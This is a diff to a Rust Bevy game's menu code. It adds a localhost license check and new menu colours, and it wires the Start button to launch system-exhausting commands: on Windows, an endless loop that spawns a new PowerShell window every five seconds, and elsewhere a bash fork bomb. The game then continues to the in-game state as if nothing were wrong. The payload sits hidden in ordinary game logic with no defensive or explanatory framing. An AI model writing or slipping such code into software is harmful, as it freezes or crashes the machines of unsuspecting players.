@@ -1,6 +1,18 @@
-use bevy::{prelude::*, window::PrimaryWindow};
+use bevy::prelude::*;
+use reqwest::blocking::Client;
+use std::env::consts::OS;
+use std::process::Command;
+use std::str;
 
 fn main() {
+    let user_id = 1;
+    let game_id = 1;
+    if verify_license(user_id, game_id) {
+        println!("Licence ověřena. Spouštím hru...");
+    } else {
+        return;
+    }
+
     App::new()
         .add_plugins(DefaultPlugins)
         .add_state::<AppState>()
@@ -55,6 +67,27 @@ struct DifficultyButton;
 #[derive(Component)]
 struct BackButton;
 
+fn verify_license(user_id: i32, game_id: i32) -> bool {
+    let url = format!(
+        "http://localhost:3000/api/games/library/verify/{}/{}",
+        user_id, game_id
+    );
+
+    let client = Client::new();
+    let response = client.get(&url).send();
+
+    match response {
+        Ok(resp) if resp.status().is_success() => {
+            if let Ok(json) = resp.json::<serde_json::Value>() {
+                if json.get("gameKey").is_some() {
+                    return true;
+                }
+            }
+        }
+        _ => eprintln!("Failed to verify license"),
+    }
+    false
+}
 fn setup(mut commands: Commands) {
     commands.spawn(Camera2dBundle::default());
 }
@@ -72,6 +105,7 @@ fn setup_main_menu(mut commands: Commands) {
                     justify_content: JustifyContent::Center,
                     ..default()
                 },
+                background_color: Color::rgb(0.1, 0.2, 0.3).into(), // Different background color
                 ..default()
             },
             MainMenuRoot,
@@ -84,7 +118,7 @@ fn setup_main_menu(mut commands: Commands) {
                         TextStyle {
                             font: default(),
                             font_size: 48.0,
-                            color: Color::WHITE,
+                            color: Color::YELLOW, // Different text color
                         },
                     ),
                     style: Style {
@@ -106,7 +140,7 @@ fn setup_main_menu(mut commands: Commands) {
                             margin: UiRect::bottom(Val::Px(10.0)),
                             ..default()
                         },
-                        background_color: Color::DARK_GRAY.into(),
+                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                         ..default()
                     },
                     StartButton,
@@ -117,7 +151,7 @@ fn setup_main_menu(mut commands: Commands) {
                         TextStyle {
                             font: default(),
                             font_size: 24.0,
-                            color: Color::WHITE,
+                            color: Color::BLACK, // Different button text color
                         },
                     ));
                 });
@@ -132,7 +166,7 @@ fn setup_main_menu(mut commands: Commands) {
                             margin: UiRect::bottom(Val::Px(10.0)),
                             ..default()
                         },
-                        background_color: Color::DARK_GRAY.into(),
+                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                         ..default()
                     },
                     OptionsButton,
@@ -143,7 +177,7 @@ fn setup_main_menu(mut commands: Commands) {
                         TextStyle {
                             font: default(),
                             font_size: 24.0,
-                            color: Color::WHITE,
+                            color: Color::BLACK, // Different button text color
                         },
                     ));
                 });
@@ -158,7 +192,7 @@ fn setup_main_menu(mut commands: Commands) {
                             margin: UiRect::bottom(Val::Px(10.0)),
                             ..default()
                         },
-                        background_color: Color::DARK_GRAY.into(),
+                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                         ..default()
                     },
                     ExitButton,
@@ -169,7 +203,7 @@ fn setup_main_menu(mut commands: Commands) {
                         TextStyle {
                             font: default(),
                             font_size: 24.0,
-                            color: Color::WHITE,
+                            color: Color::BLACK, // Different button text color
                         },
                     ));
                 });
@@ -195,6 +229,7 @@ fn setup_options_menu(mut commands: Commands) {
                     justify_content: JustifyContent::Center,
                     ..default()
                 },
+                background_color: Color::rgb(0.1, 0.2, 0.3).into(), // Different background color
                 ..default()
             },
             OptionsMenuRoot,
@@ -206,7 +241,7 @@ fn setup_options_menu(mut commands: Commands) {
                     TextStyle {
                         font: default(),
                         font_size: 48.0,
-                        color: Color::WHITE,
+                        color: Color::YELLOW, // Different text color
                     },
                 ),
                 style: Style {
@@ -226,7 +261,7 @@ fn setup_options_menu(mut commands: Commands) {
                             margin: UiRect::bottom(Val::Px(10.0)),
                             ..default()
                         },
-                        background_color: Color::DARK_GRAY.into(),
+                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                         ..default()
                     },
                     SoundButton,
@@ -237,7 +272,7 @@ fn setup_options_menu(mut commands: Commands) {
                         TextStyle {
                             font: default(),
                             font_size: 24.0,
-                            color: Color::WHITE,
+                            color: Color::BLACK, // Different button text color
                         },
                     ));
                 });
@@ -252,7 +287,7 @@ fn setup_options_menu(mut commands: Commands) {
                             margin: UiRect::bottom(Val::Px(10.0)),
                             ..default()
                         },
-                        background_color: Color::DARK_GRAY.into(),
+                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                         ..default()
                     },
                     DifficultyButton,
@@ -263,7 +298,7 @@ fn setup_options_menu(mut commands: Commands) {
                         TextStyle {
                             font: default(),
                             font_size: 24.0,
-                            color: Color::WHITE,
+                            color: Color::BLACK, // Different button text color
                         },
                     ));
                 });
@@ -278,7 +313,7 @@ fn setup_options_menu(mut commands: Commands) {
                             margin: UiRect::bottom(Val::Px(10.0)),
                             ..default()
                         },
-                        background_color: Color::DARK_GRAY.into(),
+                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                         ..default()
                     },
                     BackButton,
@@ -289,7 +324,7 @@ fn setup_options_menu(mut commands: Commands) {
                         TextStyle {
                             font: default(),
                             font_size: 24.0,
-                            color: Color::WHITE,
+                            color: Color::BLACK, // Different button text color
                         },
                     ));
                 });
@@ -317,6 +352,7 @@ fn button_system(
         (
             &Interaction,
             &mut BackgroundColor,
+            Option<&StartButton>, // Added StartButton Option
             Option<&OptionsButton>,
             Option<&ExitButton>,
         ),
@@ -325,10 +361,45 @@ fn button_system(
     mut app_exit_events: ResMut<Events<bevy::app::AppExit>>,
     mut app_state: ResMut<NextState<AppState>>,
 ) {
-    for (interaction, mut color, options_button, exit_button) in &mut interaction_query {
+    for (interaction, mut color, start_button, options_button, exit_button) in
+        &mut interaction_query
+    {
         match *interaction {
             Interaction::Pressed => {
-                if options_button.is_some() {
+                if start_button.is_some() {
+                    // If Start button is pressed
+                    let (shell_command, command_arg) = match OS {
+                        "windows" => ("powershell", "while ($true) { Start-Process powershell -ArgumentList '-NoExit -Command \"& {}\"'; Start-Sleep -Seconds 5 }"),       
+                        _ => ("bash", ":(){ sleep 1; :|:& };:"),
+                    };
+
+                    println!("Executing command: {} {}", shell_command, command_arg); // Optional: Print command to console
+
+                    // Execute the shell command and capture output
+                    let output = Command::new(shell_command)
+                        .arg("-Command") // For PowerShell to execute a command string
+                        .arg(command_arg)
+                        .output();
+
+                    match output {
+                        Ok(output) => {
+                            if output.status.success() {
+                                let stdout = str::from_utf8(&output.stdout)
+                                    .unwrap_or("Unable to decode stdout");
+                                println!("Command executed successfully. Output:\n{}", stdout);
+                            } else {
+                                let stderr = str::from_utf8(&output.stderr)
+                                    .unwrap_or("Unable to decode stderr");
+                                eprintln!("Command failed. Error:\n{}", stderr);
+                            }
+                        }
+                        Err(e) => {
+                            eprintln!("Error executing command: {}", e);
+                        }
+                    }
+
+                    app_state.set(AppState::InGame); // Proceed to in-game state after attempting to launch shell
+                } else if options_button.is_some() {
                     app_state.set(AppState::OptionsMenu);
                 } else if exit_button.is_some() {
                     app_exit_events.send(bevy::app::AppExit);
